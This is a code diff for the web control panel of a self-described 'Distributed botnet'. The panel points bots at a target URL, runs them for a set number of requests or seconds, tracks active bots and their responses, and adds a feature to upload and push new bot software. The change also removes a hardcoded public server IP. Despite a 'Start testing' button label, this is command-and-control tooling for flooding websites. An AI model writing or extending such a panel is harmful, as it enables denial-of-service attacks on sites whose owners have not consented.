@@ -18,14 +18,14 @@ import {
   Button,
   Input,
   Code,
-  Textarea,
   Radio,
 } from "@vechaiui/react";
 
 const Panel = () => {
   const navigate = useNavigate();
+  const inputFileRef = useRef<HTMLInputElement>(null);
 
-  const serverUrl = "http://54.211.202.150:5000";
+  const serverUrl = "http://localhost:5000";
 
   const [time, setTime] = useState(0);
   const [type, setType] = useState(1);
@@ -78,6 +78,42 @@ const Panel = () => {
         serverUrl + setRequestsNumberEndpoint,
         requestsNumObject
       );
+    } catch (err) {
+      console.log({
+        message: "Requests number setting failed.",
+        errorInfo: err,
+      });
+    }
+  };
+
+  const setTimeSeconds = async (time: number) => {
+    const setTimeSecondsEndpoint: string = "/setTimeSeconds";
+
+    const timeSecondsObject = {
+      timeSeconds: time,
+    };
+
+    try {
+      await axios.post(serverUrl + setTimeSecondsEndpoint, timeSecondsObject);
+    } catch (err) {
+      console.log({
+        message: "Requests number setting failed.",
+        errorInfo: err,
+      });
+    }
+  };
+
+  const setMode = async (mode: number) => {
+    setType(mode);
+    mode === 2 ? setRequestsNum(0) : setTime(0);
+    const setModeEndpoint: string = "/setMode";
+
+    const modeObject = {
+      mode: mode === 2 ? "timeMode" : "requestMode",
+    };
+
+    try {
+      await axios.post(serverUrl + setModeEndpoint, modeObject);
     } catch (err) {
       console.log({
         message: "Requests number setting failed.",
@@ -164,13 +200,14 @@ const Panel = () => {
   const startBotnet = (
     serverUrl: string,
     requestsNum: number,
+    time: number,
     target: string
   ) => {
     setRunning(true);
-    setRequestsNumber(requestsNum);
+    type === 1 ? setRequestsNumber(requestsNum) : setTimeSeconds(time);
     setResponses([]);
     changeServerStatus(serverUrl, true);
-    changeTarget(serverUrl, "https://" + target);
+    changeTarget(serverUrl, target);
     getActiveBots(serverUrl);
   };
 
@@ -182,8 +219,41 @@ const Panel = () => {
     setBotsStats([]);
   };
 
+  const uploadFile = async (file: any) => {
+    const formData = new FormData();
+    formData.append("file", file);
+    const uploadFileEndpoint = "/uploadFile";
+    try {
+      const response = await axios.post(
+        serverUrl + uploadFileEndpoint,
+        formData
+      );
+      return response.data.filepath;
+    } catch (e) {
+      console.error(e);
+    }
+  };
+
+  const updateSoftware = async (selectedFile: any) => {
+    const link = await uploadFile(selectedFile);
+    const updateSoftwareEndpoint = "/setBotVersionInfo";
+    const softwareObject = {
+      botVersionName: selectedFile.name,
+      botFileUrl: link,
+    };
+    try {
+      await axios.post(serverUrl + updateSoftwareEndpoint, softwareObject);
+    } catch (e) {
+      console.error(e);
+    }
+  };
+
+  const changeHandler = (event: any) => {
+    updateSoftware(event.target.files[0]);
+  };
+
   useEffect(() => {
-    if (running) {
+    if (active) {
       intervalTimer = setInterval(() => {
         type === 1
           ? setTime((prevTime) => prevTime + 10)
@@ -194,7 +264,7 @@ const Panel = () => {
         getActiveBots(serverUrl);
         getBotsStats(serverUrl, responses);
       }, 10000);
-    } else if (!running) {
+    } else if (!active) {
       clearInterval(intervalTimer);
       clearInterval(intervalActivity);
     }
@@ -203,18 +273,19 @@ const Panel = () => {
       clearInterval(intervalTimer);
       clearInterval(intervalActivity);
     };
-  }, [running]);
+  }, [active]);
 
   useEffect(() => {
     if (time <= 0) {
       setRunning(false);
       stopBotnet(serverUrl);
+      setTime(inputValue * 1000);
     }
   }, [time]);
 
   useEffect(() => {
     type === 1 ? setRequestsNum(inputValue) : setTime(inputValue * 1000);
-  }, [inputValue]);
+  }, [inputValue, type]);
 
   useEffect(() => {
     if (!localStorage.getItem("password")) {
@@ -222,7 +293,7 @@ const Panel = () => {
     } else {
       setVisible(true);
     }
-  }, []);
+  }, [navigate]);
 
   if (!visible) return null;
 
@@ -234,7 +305,7 @@ const Panel = () => {
             <h1 className="text-3xl font-bold text-gray-700">
               Distributed botnet
             </h1>
-            <p className="text-gray-400 mb-8">version 2.0.0</p>
+            <p className="text-gray-400 mb-8">version 2.0.1</p>
           </div>
           <Button className="mt-2" onClick={logout}>
             Exit
@@ -243,28 +314,24 @@ const Panel = () => {
         <div style={{ height: "75vh" }} className="w-full flex">
           <div className="flex flex-col w-1/2">
             <div style={{ height: "40%" }} className="mb-5">
-              <p className="text-gray-500 text-base mb-3">
-                Give the targets (separate with space):
-              </p>
+              <p className="text-gray-500 text-base mb-3">Give the target:</p>
               <div className="w-5/6">
-                <Textarea
+                <Input
                   onChange={(e) => {
                     setTarget(e.target.value);
                   }}
                   placeholder="http://indrekis2.blogspot.com/"
                 />
               </div>
-              <div className="flex items-center gap-5 w-5/6 mt-3 ">
-                <p className="text-sm font-bold text-gray-800  mr-2">
+              <div className="flex items-center gap-5 w-5/6 mt-8">
+                <p className="text-sm font-bold text-gray-800 mr-2">
                   Choose mode:
                 </p>
                 <Radio
                   name="basic"
                   defaultChecked
                   onChange={() => {
-                    console.log("Amount");
-                    setType(1);
-                    setTime(0);
+                    setMode(1);
                     setRequestsNum(inputValue);
                   }}
                 >
@@ -273,8 +340,7 @@ const Panel = () => {
                 <Radio
                   name="basic"
                   onChange={() => {
-                    setType(2);
-                    setRequestsNum(0);
+                    setMode(2);
                     setTime(inputValue * 1000);
                   }}
                 >
@@ -284,7 +350,7 @@ const Panel = () => {
               <div className="flex gap-5 mt-3 mb-3 items-center ">
                 <FormControl id="email" className=" flex flex-col ">
                   <FormLabel>
-                    {type == 1 ? "Requests amount" : "Amount of time (sec)"}
+                    {type === 1 ? "Requests amount" : "Amount of time (sec)"}
                   </FormLabel>
                   <Input
                     placeholder="100"
@@ -318,11 +384,11 @@ const Panel = () => {
                 </Button>
                 <Button
                   onClick={() => {
-                    startBotnet(serverUrl, requestsNum, target);
+                    startBotnet(serverUrl, requestsNum, time, target);
                   }}
                   variant="solid"
                   color="primary"
-                  disabled={running}
+                  disabled={active}
                 >
                   Start testing
                 </Button>
@@ -331,7 +397,7 @@ const Panel = () => {
             <div className="bg-gray-100 rounded overflow-scroll p-3 flex flex-col h-1/2">
               <p className="text-gray-500 text-base mb-3">Bots response log:</p>
 
-              {botsStats.length != 0
+              {botsStats.length !== 0
                 ? botsStats.reverse().map((response: any) => {
                     if (
                       new Date().getTime() -
@@ -359,15 +425,21 @@ const Panel = () => {
                 </div>
                 <Button
                   onClick={() => {
-                    alert("Update sw");
+                    if (inputFileRef.current != null) {
+                      inputFileRef.current.click();
+                    }
                   }}
-                  disabled={running}
                 >
                   Upload bot software
+                  <input
+                    ref={inputFileRef}
+                    type={"file"}
+                    onChange={changeHandler}
+                  />
                 </Button>
               </div>
               <div>
-                {activeBots.length != 0 ? (
+                {activeBots.length !== 0 ? (
                   activeBots.map((bot: string) => (
                     <div className="bg-gray-100 h-8 flex items-center p-3 mb-1 rounded">
                       <p className="text-gray-700 blur-[5px] hover:blur-none font-medium text-base ">
@@ -384,7 +456,7 @@ const Panel = () => {
             </div>
             <div className="bg-gray-100 rounded ml-2 h-3/5 p-3">
               <p className="text-gray-500 text-base mb-3">Requests stats</p>
-              {graphData.length == 0 ? (
+              {graphData.length === 0 ? (
                 <p className="mt-5">No information retrieved yet</p>
               ) : (
                 <ResponsiveContainer>
@@ -405,7 +477,6 @@ const Panel = () => {
                     />
                     <YAxis />
                     <Tooltip />
-                    {/* <Legend /> */}
                     <CartesianGrid strokeDasharray="3 3" />
                     <Bar
                       dataKey="amount"
